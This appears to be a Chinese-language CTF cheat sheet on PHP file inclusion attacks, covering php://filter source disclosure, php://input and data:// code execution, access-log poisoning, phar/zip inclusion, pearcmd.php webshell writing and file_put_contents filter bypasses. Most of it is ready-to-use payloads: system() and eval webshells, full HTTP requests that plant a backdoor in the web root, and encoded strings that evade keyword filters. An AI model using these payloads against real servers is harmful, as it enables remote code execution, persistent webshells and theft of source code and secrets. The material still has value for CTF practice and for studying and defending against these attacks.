allow_url_include=off默认关闭，开发者使用文件包含往往会开启
allow_url_fopen=on默认开启，一般不用管
<https://blog.csdn.net/weixin_44508748/article/details/108162951>

^
## **php伪协议 文件包含读本地php文件源代码**
```
include xx;
@include(xx);
include php://filter/read=convert.base64-encode/resource=flag.php

包含返回flag.php文件源码字符串的是base64编码内容
进行一次base64解码即可看到源代码

如果是根据名称匹配包含php文件
只需要把名称参数换成php://filter/read=convert.base64-encode/resource=flag即可。

也可中间加个index等字符也可以。
php://filter/read=convert.base64-encode/index/resource=flag
```

^
## **php伪协议 文件包含注入php的php代码**

1. php://input 自动包含POST请求体(需要第一allow_url_include开启)

```
include php://input
post请求的请求体参数xx=<?php system(); ?>
请求体直接就一个<?php system(); ?>也可。

如：
?file=Php://input  这里大写可以绕过过滤php
再post：<?php system("tac flag.php");?>

```

2. data://text/plain直接包含代码内容:(需要两个allow开启)
```
include data://text/plain,<?php phpinfo(); ?>

file_get_contents('data://text/plain,welcome to the zjctf','r')
即为welcome to the zjctf

file_get_contents($_GET['2333']) === 'todat is a happy day'
则?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=


代码执行获取flag
payload：
?c=data://text/plain,<?php system('cat f*');?>
?c=data://text/plain,<?=system("tac%20flag.php");?>

防止过滤一下：?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==
但是结尾有.php的情况：include($c.".php"); 编码后会失效。
```

^
## **日志包含**
考伪协议绕过也可能直接日志包含
?file=/var/log/nginx/access.log
修改UA为：<?php @eval($_REQUEST[1])?>
1=system("ls");
1=system("tac fl0g.php");




^
## **php伪协议 文件包含自动解压文件再包含**
```
phar://D:/phpinfo.zip/phpinfo.txt
zip://D:\\phpinfo.jpg%23phpinfo.txt

上传了个压缩包，压缩包中phpinfo.txt中文件为<?php system($_GET[a]); ?>
```


## **pearcmd.php文件包含**
已知文件包含：include $_GET['c'].".php";
裸文件包含, 没有上传点, 可供尝试的只有pearcmd.php上传木马。
先用
```
GET /index.php?+config-create+/&c=pearcmd&/<?=@eval($_POST['cmd']);?>+/var/www/html/test.php HTTP/1.1
```
在/var/www/html下写入webshell
再
```
POST /test.php HTTP/1.1

Content-Type: application/x-www-form-urlencoded
Content-Length: 26

cmd=system("cat 36d.php");
```
也可<https://www.cnblogs.com/Egcrying/p/17665041.html>



^
## **php伪协议写文件**
## **file_put_contents()场景写文件漏洞**
1、写后门过滤绕过
对于
```
if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|{|}/i",$input)){
        die('hacker!!!');
}
file_put_contents("index.php", $input)
```
可以传入绕过
```
<?=`ls\t/*`?>
<?=`cat\t/flllllll1112222222lag`?>
```

^
2、伪协议写后门绕过
如果是第一个参数可控，使用伪协议。
```
$file = $_GET['file'];
$content = $_POST['content'];

$file = str_replace("php", "???", $file);
$file = str_replace("data", "???", $file);
$file = str_replace(":", "???", $file);
$file = str_replace(".", "???", $file);

file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
```
绕过替换，$file使用双重url编码。
绕过die()函数，$file使用base64伪协议。将die()过滤成die无效字符。
```
?file=php://filter/write=convert.base64-decode/resource=jiuzhen.php
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%61%25%36%39%25%37%35%25%37%61%25%36%38%25%36%35%25%36%65%25%32%65%25%37%30%25%36%38%25%37%30
```
POST传递：
```
content=<?php system(ls);?>   //base64编码—下
content=PD9waHAgc3lzdGVtKGxzKTs/Pg==
content=aaPD9waHAgc3lzdGVtKGxzKTs/Pg== //加两个字符
//<?php die('大佬别秀了');?>被base64过滤后变成phpdie，加两个字符变成4的倍数。
```
访问jiuzhen.php即可。